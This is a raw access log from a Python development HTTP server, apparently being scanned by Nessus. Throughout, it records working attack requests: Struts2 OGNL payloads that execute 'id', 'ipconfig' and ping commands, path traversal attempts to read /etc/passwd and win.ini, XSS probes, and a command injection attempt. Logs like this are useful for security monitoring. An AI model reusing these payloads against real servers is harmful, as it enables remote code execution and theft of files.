Serving HTTP on 0.0.0.0 port 9011 (http://0.0.0.0:9011/) ...
10.200.14.175 - - [12/Nov/2024 19:01:59] "GET / HTTP/1.0" 200 -
10.200.14.175 - - [12/Nov/2024 19:01:59] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:01:59] "GET /bigipgui/bigconf.cgi?command=bigcommand&CommandType=bigpipe HTTP/1.0" 404 -
10.200.14.175 - - [12/Nov/2024 19:01:59] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:01:59] "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:01:59] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:01:59] "GET /this_page_should_not_exist.htm HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:01:59] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:01:59] "GET /qwe/qwe/index.html HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:02:00] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:00] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:02:00] "GET /SMB/console/html/cgi/cgiChkMasterPwd.exe HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:02:20] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:20] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:20] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:22] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:22] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:02:22] "GET /index.php/..namedfork/data HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:02:22] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:22] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:22] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:02:22] "GET /support/messages HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:02:43] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:02:43] "GET /?tag=tenable-321805562&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:03:20] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:03:20] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:03:25] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:04:25] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:04:25] "POST / HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:04:57] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:04:57] "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:04:57] "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'ipconfig'})).start()} HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:04:57] "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201731438297%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:04:58] "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p4247553052744c647371%2010.200.14.175%27%29.getInputStream%28%29%29%7d HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:03] "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:06] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:06] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:06] "GET //${%23context['xwork.MethodAccessor.denyMethodExecution']=!(%23_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('id').waitFor()}.action HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:06] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:06] "GET //${%23context['xwork.MethodAccessor.denyMethodExecution']=!(%23_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('ipconfig').waitFor()}.action HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:12] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:13] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:21] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:21] "GET //(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]):index.xhtml?cmd=ping%20%2dc%203%20%2dp%20345a4e384a6d69777832%2010.200.14.175 HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:23] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:33] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:33] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:33] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:42] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:43] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:43] "GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET /getfile?key=/dummy.file HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /flex2gateway/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /blazeds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /lcds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /flex2gateway/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /blazeds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /lcds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /flex2gateway/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /blazeds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:51] "POST /lcds/messagebroker/http HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:51] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:51] "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:52] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET /index.jsp HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:52] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET /index.jsp HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:52] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET /web.config HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:52] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:52] "GET /scripts/w3who.dll HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET /cgi-bin/filescan HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET /caspadmin/index.asp HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:53] "POST / HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:53] code 400, message Bad request version ('¶\\x95cÊ*éß\\x00\\x00RÀ')
10.200.14.175 - - [12/Nov/2024 19:05:53] "\x16\x03\x01\x00Æ\x01\x00\x00Â\x03\x01\x850\x0bf+·uk¹\x01\x09ö¤\x07øF\x04$\x92Ò\x9e*É\x1d ¶\x95cÊ*éß\x00\x00RÀ" 400 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET //struts/webconsole.html HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1731438354 HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /.anydomain.test HTTP/1.0" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:54] "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:54] "POST / HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /././.. HTTP/1.1" 301 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /std.html HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /version HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /search?NS-query-pat=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:54] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:54] "GET /status.xsl. HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:55] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:55] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:55] "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:55] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:55] "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:55] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:55] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:55] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:56] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:56] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:56] "POST /FormHandler.cgi HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:57] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:57] "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:57] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:57] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:57] "GET /Ynxxu6WZoeLj HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:58] code 501, message Unsupported method ('PUT')
10.200.14.175 - - [12/Nov/2024 19:05:58] "PUT /Ynxxu6WZoeLj HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:58] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:58] "GET /Ynxxu6WZoeLj HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:05:58] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:58] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:05:58] "POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:05:59] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:05:59] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:05:59] "GET /DB4Web/itso-scanner-dku-users-1-104.oit.duke.edu:23/foo HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:00] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:00] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:00] "GET /WebInterface/ HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:00] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:00] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:02] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:02] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:02] "GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=..\\..\\..\\Windows\\System32\\drivers\\etc\\&readmeText=1 HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:02] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:03] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:03] "GET /backend/settings/oauth_adfs?hostname=chatdku.dukekunshan.edu.cn HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:05] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:05] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:05] "GET /dev/ HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:05] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:05] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:05] "GET /gui/ HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:07] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:07] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:07] "GET /gui/ HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:07] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:08] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:08] "GET /axis/DirectDownload.jsp HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:09] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:09] "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%206b7373465a50596d4b49%2010.200.14.175%27%29%29%7D// HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:19] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:19] "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p%206b7373465a50596d4b49%2010.200.14.175%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:19] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:19] code 501, message Unsupported method ('POST')
10.200.14.175 - - [12/Nov/2024 19:06:19] "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 501 -
10.200.14.175 - - [12/Nov/2024 19:06:19] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:19] "GET / HTTP/1.1" 200 -
10.200.14.175 - - [12/Nov/2024 19:06:20] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:20] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:20] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:20] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 -
10.200.14.175 - - [12/Nov/2024 19:06:20] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:20] "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 -
----------------------------------------
Exception occurred during processing of request from ('10.200.14.175', 33208)
Traceback (most recent call last):
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socketserver.py", line 683, in process_request_thread
    self.finish_request(request, client_address)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 1304, in finish_request
    self.RequestHandlerClass(request, client_address, self,
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 668, in __init__
    super().__init__(*args, **kwargs)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socketserver.py", line 747, in __init__
    self.handle()
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 433, in handle
    self.handle_one_request()
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 401, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socket.py", line 705, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
10.200.14.175 - - [12/Nov/2024 19:06:20] code 404, message File not found
10.200.14.175 - - [12/Nov/2024 19:06:20] "GET /..\\pixfir~1\\how_to_login.html HTTP/1.1" 404 -
----------------------------------------
Exception occurred during processing of request from ('10.200.14.175', 33220)
Traceback (most recent call last):
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socketserver.py", line 683, in process_request_thread
    self.finish_request(request, client_address)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 1304, in finish_request
    self.RequestHandlerClass(request, client_address, self,
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 668, in __init__
    super().__init__(*args, **kwargs)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socketserver.py", line 747, in __init__
    self.handle()
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 433, in handle
    self.handle_one_request()
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/http/server.py", line 401, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/home/Glitterccc/miniconda3/envs/chatdku/lib/python3.10/socket.py", line 705, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
10.200.14.175 - - [12/Nov/2024 19:06:20] code 404, message File not found
